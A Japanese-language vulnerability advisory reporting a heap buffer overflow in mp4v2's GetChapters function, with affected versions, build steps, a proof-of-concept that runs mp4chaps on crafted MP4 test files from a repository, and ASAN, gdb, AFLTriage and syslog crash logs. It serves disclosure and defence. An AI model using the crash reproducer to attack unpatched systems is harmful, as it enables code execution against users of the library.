# mp4v2におけるヒープベースのバッファオーバーフローの脆弱性

## 概要
mp4v2に含まれる、チャプター操作を行うためのツールであるmp4chapsには、ヒープベースのバッファオーバーフローの脆弱性が存在します。

## 影響を受けるシステム
- mp4v2 v2.1.3
- mp4v2 v2.1.2
- mp4v2 v2.1.1
- mp4v2 v2.1.0
- おそらくそれ以下も

## 詳細情報
深刻度 - 高 (Severity: High)

mp4v2のmp4file.cppには、ヒープベースのバッファオーバーフロー（CWE-122）の脆弱性が存在します。
本脆弱性の原因となる関数は、以下の通りです。
- mp4file.cpp:2662 in MP4File::GetChapters

## 想定される影響
- 共有ライブラリ（libmp4v2.so.2）における脆弱性のため、mp4chapsを使用する場合以外にも発生する可能性があります。
- 第三者によって細工されたファイルが入力されると任意のコードを実行される可能性があります。


## ベンダ情報
[https://github.com/enzo1982/mp4v2/releases/tag/v2.1.3](https://github.com/enzo1982/mp4v2/releases/tag/v2.1.3)


## ビルド例
```
cd /opt
git clone https://github.com/enzo1982/mp4v2.git -b v2.1.3 --depth 1
cd ./mp4v2
mkdir build
cmake -DCMAKE_BUILD_TYPE=Debug ../
cmake --build . -j 10
```

ASANを有効にする場合は、以下のようなオプションをCMakeFiles.txtに追記してください。

```
add_compile_options(-fsanitize=address)
add_link_options(-fsanitize=address)
```

## PoC
テストケースをクローンし、mp4chapsに入力すると、コアダンプが発生します。

```
git clone https://github.com/mugichiya/pocky.git
cp -r ./pocky/projects/mp4v2_hof/testcases .
./mp4chaps --list ./testcases/0000000000.mp4
```

## Log
以下に、発生時のログをいくつか掲載します。

### ASAN
```
banjo@ttc:/opt/mp4v2/build$ ./mp4chaps --list ../../0000000000.mp4 
ReadAtom: "../../0000000000.mp4": invalid atom size, extends outside parent atom - skipping to end of "stbl" "stco" 150996203 vs 1279
=================================================================
==5147==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000003b11 at pc 0x7f562f5e80f7 bp 0x7ffe6f3c6680 sp 0x7ffe6f3c6670
READ of size 1 at 0x602000003b11 thread T0
    #0 0x7f562f5e80f6 in mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType) /opt/mp4v2/src/mp4file.cpp:2662
    #1 0x7f562f5b7177 in MP4GetChapters /opt/mp4v2/src/mp4.cpp:1647
    #2 0x555e9921415a in mp4v2::util::ChapterUtility::actionList(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:182
    #3 0x555e9921a581 in mp4v2::util::ChapterUtility::utility_job(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:664
    #4 0x7f562f4e44c5 in mp4v2::util::Utility::job(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) /opt/mp4v2/libutil/Utility.cpp:298
    #5 0x7f562f4e2595 in mp4v2::util::Utility::batch(int) /opt/mp4v2/libutil/Utility.cpp:105
    #6 0x7f562f4e718d in mp4v2::util::Utility::process_impl() /opt/mp4v2/libutil/Utility.cpp:565
    #7 0x7f562f4e6252 in mp4v2::util::Utility::process() /opt/mp4v2/libutil/Utility.cpp:449
    #8 0x555e9921d794 in main /opt/mp4v2/util/mp4chaps.cpp:1188
    #9 0x7f562edf0082 in __libc_start_main ../csu/libc-start.c:308
    #10 0x555e9921012d in _start (/opt/mp4v2/build2/mp4chaps+0xf12d)

0x602000003b11 is located 0 bytes to the right of 1-byte region [0x602000003b10,0x602000003b11)
allocated by thread T0 here:
    #0 0x7f562f948808 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cc:144
    #1 0x7f562f4d9392 in mp4v2::impl::MP4Malloc(unsigned long) /opt/mp4v2/src/mp4util.h:63
    #2 0x7f562f615dbc in mp4v2::impl::MP4Track::ReadSample(unsigned int, unsigned char**, unsigned int*, unsigned long*, unsigned long*, unsigned long*, bool*, bool*, unsigned int*) /opt/mp4v2/src/mp4track.cpp:323
    #3 0x7f562f5e8016 in mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType) /opt/mp4v2/src/mp4file.cpp:2655
    #4 0x7f562f5b7177 in MP4GetChapters /opt/mp4v2/src/mp4.cpp:1647
    #5 0x555e9921415a in mp4v2::util::ChapterUtility::actionList(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:182
    #6 0x555e9921a581 in mp4v2::util::ChapterUtility::utility_job(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:664
    #7 0x7f562f4e44c5 in mp4v2::util::Utility::job(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) /opt/mp4v2/libutil/Utility.cpp:298
    #8 0x7f562f4e2595 in mp4v2::util::Utility::batch(int) /opt/mp4v2/libutil/Utility.cpp:105
    #9 0x7f562f4e718d in mp4v2::util::Utility::process_impl() /opt/mp4v2/libutil/Utility.cpp:565
    #10 0x7f562f4e6252 in mp4v2::util::Utility::process() /opt/mp4v2/libutil/Utility.cpp:449
    #11 0x555e9921d794 in main /opt/mp4v2/util/mp4chaps.cpp:1188
    #12 0x7f562edf0082 in __libc_start_main ../csu/libc-start.c:308

SUMMARY: AddressSanitizer: heap-buffer-overflow /opt/mp4v2/src/mp4file.cpp:2662 in mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType)
Shadow bytes around the buggy address:
  0x0c047fff8710: fa fa 04 fa fa fa 04 fa fa fa fd fa fa fa fd fd
  0x0c047fff8720: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 04 fa
  0x0c047fff8730: fa fa 04 fa fa fa 04 fa fa fa 04 fa fa fa 01 fa
  0x0c047fff8740: fa fa fd fd fa fa 04 fa fa fa 04 fa fa fa fd fa
  0x0c047fff8750: fa fa 00 00 fa fa 04 fa fa fa 00 fa fa fa 00 00
=>0x0c047fff8760: fa fa[01]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8770: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff87a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff87b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==5147==ABORTING

```

### Backtrace
```
(gdb) backtrace
#0  0x00007ffff7f393ef in mp4v2::impl::MP4File::GetChapters (
    this=0x55555559b590, chapterList=0x7fffffffd198, 
    chapterCount=0x7fffffffd18c, fromChapterType=MP4ChapterTypeAny)
    at /opt/mp4v2/src/mp4file.cpp:2662
#1  0x00007ffff7f1dd83 in MP4GetChapters (hFile=0x55555559b590, 
    chapterList=0x7fffffffd198, chapterCount=0x7fffffffd18c, 
    fromChapterType=MP4ChapterTypeAny)
    at /opt/mp4v2/src/mp4.cpp:1647
#2  0x000055555555ea90 in mp4v2::util::ChapterUtility::actionList (
    this=0x7fffffffd6a0, job=...)
    at /opt/mp4v2/util/mp4chaps.cpp:182
#3  0x00005555555614eb in mp4v2::util::ChapterUtility::utility_job (
    this=0x7fffffffd6a0, job=...)
    at /opt/mp4v2/util/mp4chaps.cpp:664
#4  0x00007ffff7eb5600 in mp4v2::util::Utility::job (this=0x7fffffffd6a0, 
    arg="../../0000000000.mp4")
    at /opt/mp4v2/libutil/Utility.cpp:298
#5  0x00007ffff7eb4921 in mp4v2::util::Utility::batch (this=0x7fffffffd6a0, 
    argi=2) at /opt/mp4v2/libutil/Utility.cpp:105
#6  0x00007ffff7eb68e4 in mp4v2::util::Utility::process_impl (
    this=0x7fffffffd6a0) at /opt/mp4v2/libutil/Utility.cpp:565
#7  0x00007ffff7eb63a7 in mp4v2::util::Utility::process (this=0x7fffffffd6a0)
    at /opt/mp4v2/libutil/Utility.cpp:449
```


### AFLTriage
```
Summary: CRASH detected in mp4v2::impl::MP4File::GetChapters due to a fault at or near 0x0000000000000000 leading to SIGSEGV (si_signo=11) / SEGV_MAPERR (si_code=1)
Command line: ./build/mp4chaps --list @@
Testcase: ./mp4v2_hof/testcases/0000000000.mp4
Crash bucket: 32629bac367c20f8da2031b50e3a0cd2

Crashing thread backtrace:
#0  0x00007ffff7f393ef in mp4v2::impl::MP4File::GetChapters (/./build/libmp4v2.so.2)
                       2618: MP4ChapterType mp4v2::impl::MP4File::GetChapters(this = (mp4v2::impl::MP4File * const)0x55555559b590, chapterList = (MP4Chapter_t **)0x7fffffffd0c8, chapterCount = (uint32_t *)0x7fffffffd0bc, fromChapterType = (MP4ChapterType)MP4ChapterTypeAny) {
                       ||||:
                       ||||: /* Local reference: uint8_t * sample = 0x0; */
                       ||||: /* Local reference: const char * title = 0x2 <error: Cannot access memory at address 0x2>; */
                       ||||: /* Local reference: int titleLen = 1023; */
                       2660:                     // we know that sample+2 contains the title (sample[0] and sample[1] is the length)
                       2661:                     const char * title = (const char *)&(sample[2]);
                       2662:                     int titleLen = min((uint32_t)((sample[0] << 8) | sample[1]), (uint32_t)MP4V2_CHAPTER_TITLE_MAX);
                       ||||:
                       ----: }
                       at /./src/mp4file.cpp:2662

#1  0x00007ffff7f1dd83 in MP4GetChapters (/./build/libmp4v2.so.2)
                       1642: MP4ChapterType MP4GetChapters(hFile = (MP4FileHandle)0x55555559b590, chapterList = (MP4Chapter_t **)0x7fffffffd0c8, chapterCount = (uint32_t *)0x7fffffffd0bc, fromChapterType = (MP4ChapterType)MP4ChapterTypeAny) {
                       ||||:
                       ||||: /* Local reference: MP4FileHandle hFile = 0x55555559b590; */
                       ||||: /* Local reference: MP4Chapter_t ** chapterList = 0x7fffffffd0c8; */
                       ||||: /* Local reference: uint32_t * chapterCount = 0x7fffffffd0bc; */
                       ||||: /* Local reference: MP4ChapterType fromChapterType = MP4ChapterTypeAny; */
                       1645:         if (MP4_IS_VALID_FILE_HANDLE(hFile)) {
                       1646:             try {
                       1647:                 return ((MP4File*)hFile)->GetChapters(chapterList, chapterCount, fromChapterType);
                       ||||:
                       ----: }
                       at /./src/mp4.cpp:1647

#2  0x000055555555ea90 in mp4v2::util::ChapterUtility::actionList (/./build/mp4chaps)
                       170: bool mp4v2::util::ChapterUtility::actionList(this = (mp4v2::util::ChapterUtility * const)0x7fffffffd5d0, job = (mp4v2::util::Utility::JobContext &)@0x7fffffffd400) {
                       |||:
                       |||: /* Local reference: MP4Chapter_t * chapters = 0x0; */
                       |||: /* Local reference: MP4ChapterType chtp = MP4ChapterTypeNone; */
                       |||: /* Local reference: uint32_t chapterCount = 0; */
                       |||: /* Local reference: mp4v2::util::Utility::JobContext & job = @0x7fffffffd400; */
                       180: 
                       181:     // get the list of chapters
                       182:     MP4ChapterType chtp = MP4GetChapters(job.fileHandle, &chapters, &chapterCount, _ChapterType);
                       |||:
                       ---: }
                       at /./util/mp4chaps.cpp:182

#3  0x00005555555614eb in mp4v2::util::ChapterUtility::utility_job (/./build/mp4chaps)
                       657: bool mp4v2::util::ChapterUtility::utility_job(this = (mp4v2::util::ChapterUtility * const)0x7fffffffd5d0, job = (mp4v2::util::Utility::JobContext &)@0x7fffffffd400) {
                       |||:
                       |||: /* Local reference: mp4v2::util::ChapterUtility * const this = 0x7fffffffd5d0; */
                       |||: /* Local reference: mp4v2::util::Utility::JobContext & job = @0x7fffffffd400; */
                       662:     }
                       663: 
                       664:     return (this->*_action)( job );
                       |||:
                       ---: }
                       at /./util/mp4chaps.cpp:664

#4  0x00007ffff7eb5600 in mp4v2::util::Utility::job (/./build/libmp4v2.so.2)
                       290: bool mp4v2::util::Utility::job(this = (mp4v2::util::Utility * const)0x7fffffffd5d0, arg = (const std::string &)"/._hof/testcases/0000000000.mp4") {
                       |||:
                       |||: /* Local reference: bool result = true; */
                       |||: /* Local reference: mp4v2::util::Utility::JobContext job = {file = "/._hof/testcases/0000000000.mp4", fileHandle = 0x55555559b590, optimizeApplicable = false, tofree = empty std::__cxx11::list}; */
                       296:     bool result = FAILURE;
                       297:     try {
                       298:         result = utility_job( job );
                       |||:
                       ---: }
                       at /./libutil/Utility.cpp:298

#5  0x00007ffff7eb4921 in mp4v2::util::Utility::batch (/./build/libmp4v2.so.2)
                        92: bool mp4v2::util::Utility::batch(this = (mp4v2::util::Utility * const)0x7fffffffd5d0, argi = (int)2) {
                       |||:
                       |||: /* Local reference: bool subResult = true; */
                       |||: /* Local reference: int i = 2; */
                       103:         bool subResult = FAILURE;
                       104:         try {
                       105:             if( !job( _argv[i] )) {
                       |||:
                       ---: }
                       at /./libutil/Utility.cpp:105

#6  0x00007ffff7eb68e4 in mp4v2::util::Utility::process_impl (/./build/libmp4v2.so.2)
                       463: bool mp4v2::util::Utility::process_impl(this = (mp4v2::util::Utility * const)0x7fffffffd5d0) {
                       |||:
                       |||: /* Local reference: const bool result = false; */
                       563:     }
                       564: 
                       565:     const bool result = batch( prog::optind );
                       |||:
                       ---: }
                       at /./libutil/Utility.cpp:565

#7  0x00007ffff7eb63a7 in mp4v2::util::Utility::process (/./build/libmp4v2.so.2)
                       444: bool mp4v2::util::Utility::process(this = (mp4v2::util::Utility * const)0x7fffffffd5d0) {
                       |||:
                       |||: /* Local reference: bool rv = true; */
                       447: 
                       448:     try {
                       449:         rv = process_impl();
                       |||:
                       ---: }
                       at /./libutil/Utility.cpp:449

#8  0x0000555555562a3b in main (/./build/mp4chaps)
                       1185: int main(argc = (int)3, argv = (char **)0x7fffffffdfa8) {
                       ||||: /* Local reference: mp4v2::util::ChapterUtility util = {<mp4v2::util::Utility> = {_vptr.Utility = 0x55555556b9d8 <vtable for mp4v2::util::ChapterUtility+16>, _help = "\nACTIONS\n -l, --list", ' ' <repeats 11 times>, "lis... */
                       ||||: /* Local reference: int argc = 3; */
                       ||||: /* Local reference: char ** argv = 0x7fffffffdfa8; */
                       1186: {
                       1187:     mp4v2::util::ChapterUtility util( argc, argv );
                       1188:     return util.process();
                       ||||:
                       ----: }
                       at /./util/mp4chaps.cpp:1188

Crash context:
/* Register reference: rax - 0x0000000000000000 (0) */
Execution stopped here ==> 0x00007ffff7f393ef: movzx  eax,BYTE PTR [rax]

Register info:
   rax - 0x0000000000000000 (0)
   rbx - 0x00005555555a8cc8 (93824992578760)
   rcx - 0x0000000000000000 (0)
   rdx - 0x0000000000000000 (0)
   rsi - 0x0000000000000000 (0)
   rdi - 0x00005555555a1580 (93824992548224)
   rbp - 0x00007fffffffd040 (0x7fffffffd040)
   rsp - 0x00007fffffffcf70 (0x7fffffffcf70)
    r8 - 0x00000000000000fe (254)
    r9 - 0x00000000000000fe (254)
   r10 - 0x00007ffff7e6a6d1 (140737352476369)
   r11 - 0x0000000000000206 (518)
   r12 - 0x000055555555cda0 (93824992267680)
   r13 - 0x00007fffffffdfa0 (140737488347040)
   r14 - 0x0000000000000000 (0)
   r15 - 0x0000000000000000 (0)
   rip - 0x00007ffff7f393ef (0x7ffff7f393ef <mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType)+473>)
eflags - 0x00010202 ([ IF RF ])
    cs - 0x00000033 (51)
    ss - 0x0000002b (43)
    ds - 0x00000000 (0)
    es - 0x00000000 (0)
    fs - 0x00000000 (0)
    gs - 0x00000000 (0)
```


### Syslog
```
Sep 21 10:12:48 ttc kernel: [ 1813.518871] mp4chaps[8717]: segfault at 0 ip 00007f2d7ec9c3ef sp 00007ffd40b4a890 error 4 in libmp4v2.so.2.1.3[7f2d7ebf5000+d1000]
Sep 21 10:12:48 ttc kernel: [ 1813.518884] Code: 48 8d 4d 90 48 8d 55 88 8b b5 74 ff ff ff 48 8b 45 b0 48 89 c7 e8 31 bf f6 ff 48 8b 45 80 48 83 c0 02 48 89 45 c0 48 8b 45 80 <0f> b6 00 0f b6 c0 c1 e0 08 89 c2 48 8b 45 80 48 83 c0 01 0f b6 00
```
